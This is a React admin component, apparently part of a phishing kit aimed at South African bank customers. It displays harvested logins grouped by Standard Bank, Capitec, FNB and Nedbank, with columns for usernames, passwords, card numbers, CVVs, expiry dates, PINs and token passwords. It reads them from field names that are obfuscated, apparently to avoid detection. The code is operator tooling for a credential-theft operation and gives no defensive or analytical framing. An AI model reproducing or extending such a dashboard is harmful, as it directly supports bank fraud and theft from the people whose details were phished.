import React from "react";
import { Box, Typography } from "@mui/material";
import { useContext } from "react";
import AdminDataContext from "../../../context/AdminDataContext";
import parseDate from "../../../utils/parseDate";

const LoginDetails = () => {
  const { loginsData } = useContext(AdminDataContext);

  const standardBank = loginsData?.filter(
    (login) => login?.data?.bank.toLowerCase() === "standard bank"
  );

  const capitecBank = loginsData?.filter(
    (login) => login?.data?.bank.toLowerCase() === "capitec bank"
  );

  const fnbBank = loginsData?.filter(
    (login) => login?.data?.bank.toLowerCase() === "fnb bank"
  );

  const nedbank = loginsData?.filter(
    (login) => login?.data?.bank.toLowerCase() === "nedbank"
  );

  console.log(loginsData);

  return (
    <>
      {loginsData && loginsData.length > 0 && (
        <Box mt={8}>
          <Typography fontSize={24} fontWeight={700} mb={4}>
            Submitted Bank Logins
          </Typography>

          {standardBank && standardBank.length > 0 && (
            <div id="table-container" style={{ marginTop: "2rem" }}>
              <Typography
                fontSize={18}
                fontWeight={600}
                mb={4}
                textAlign="center"
              >
                Standard Bank
              </Typography>
              <table>
                <tr id="table-head-row">
                  <th>Client</th>
                  <th>Date</th>
                  <th>Username</th>
                  <th>Password</th>
                  <th>Card NO</th>
                  <th>CVV</th>
                  <th>Expiry Date</th>
                  <th>Pin</th>
                </tr>
                {[...standardBank]
                  .sort((a, b) => b.timeStamp.seconds - a.timeStamp.seconds)
                  .map((login) => (
                    <tr key={login?._user}>
                      <td>{login?.user_name}</td>
                      <td>{parseDate(login.timeStamp.seconds * 1000)}</td>
                      <td>{login?.data?.username}</td>
                      <td>{login?.data?._pas_swo_rd}</td>
                      <td>{login?.data?._ca_rd_Num_ber}</td>
                      <td>{login?.data?._c_v_v_}</td>
                      <td>
                        {parseDate(login?.data?._exp_iry_Da_te_.seconds * 1000)}
                      </td>
                      <td>{login?.data?._p_i_n_}</td>
                    </tr>
                  ))}
              </table>
            </div>
          )}
          {capitecBank && capitecBank.length > 0 && (
            <div id="table-container" style={{ marginTop: "2rem" }}>
              <Typography
                fontSize={18}
                fontWeight={600}
                mb={4}
                textAlign="center"
              >
                Capitec Bank
              </Typography>
              <table>
                <tr id="table-head-row">
                  <th>Client</th>
                  <th>Date</th>
                  <th>Account Number / Username</th>
                  <th>Token Password</th>
                </tr>
                {[...capitecBank]
                  .sort((a, b) => b.timeStamp.seconds - a.timeStamp.seconds)
                  .map((login) => (
                    <tr key={login?._user}>
                      <td>{login?.user_name}</td>
                      <td>{parseDate(login.timeStamp.seconds * 1000)}</td>
                      <td>{login?.data?.account_number}</td>
                      <td>{login?.data?.token_password}</td>
                    </tr>
                  ))}
              </table>
            </div>
          )}

          {fnbBank && fnbBank.length > 0 && (
            <div id="table-container" style={{ marginTop: "2rem" }}>
              <Typography
                fontSize={18}
                fontWeight={600}
                mb={4}
                textAlign="center"
              >
                FNB
              </Typography>
              <table>
                <tr id="table-head-row">
                  <th>Client</th>
                  <th>Date</th>
                  <th>Username</th>
                  <th>Password</th>
                  <th>Card NO</th>
                  <th>CVV</th>
                  <th>Expiry Date</th>
                  <th>Pin</th>
                </tr>
                {[...fnbBank]
                  .sort((a, b) => b.timeStamp.seconds - a.timeStamp.seconds)
                  .map((login) => (
                    <tr key={login?._user}>
                      <td>{login?.user_name}</td>
                      <td>{parseDate(login.timeStamp.seconds * 1000)}</td>
                      <td>{login?.data?.username}</td>
                      <td>{login?.data?._pas_swo_rd}</td>
                      <td>{login?.data?._ca_rd_Num_ber}</td>
                      <td>{login?.data?._c_v_v_}</td>
                      <td>
                        {parseDate(login?.data?._exp_iry_Da_te_.seconds * 1000)}
                      </td>
                      <td>{login?.data?._p_i_n_}</td>
                    </tr>
                  ))}
              </table>
            </div>
          )}
          {nedbank && nedbank.length > 0 && (
            <div id="table-container" style={{ marginTop: "2rem" }}>
              <Typography
                fontSize={18}
                fontWeight={600}
                mb={4}
                textAlign="center"
              >
                NedBank
              </Typography>
              <table>
                <tr id="table-head-row">
                  <th>Client</th>
                  <th>Date</th>
                  <th>Username</th>
                  <th>Password</th>
                </tr>
                {[...nedbank]
                  .sort((a, b) => b.timeStamp.seconds - a.timeStamp.seconds)
                  .map((login) => (
                    <tr key={login?._user}>
                      <td>{login?.user_name}</td>
                      <td>{parseDate(login.timeStamp.seconds * 1000)}</td>
                      <td>{login?.data?.username}</td>
                      <td>{login?.data?.password}</td>
                    </tr>
                  ))}
              </table>
            </div>
          )}
        </Box>
      )}
    </>
  );
};

export default LoginDetails;
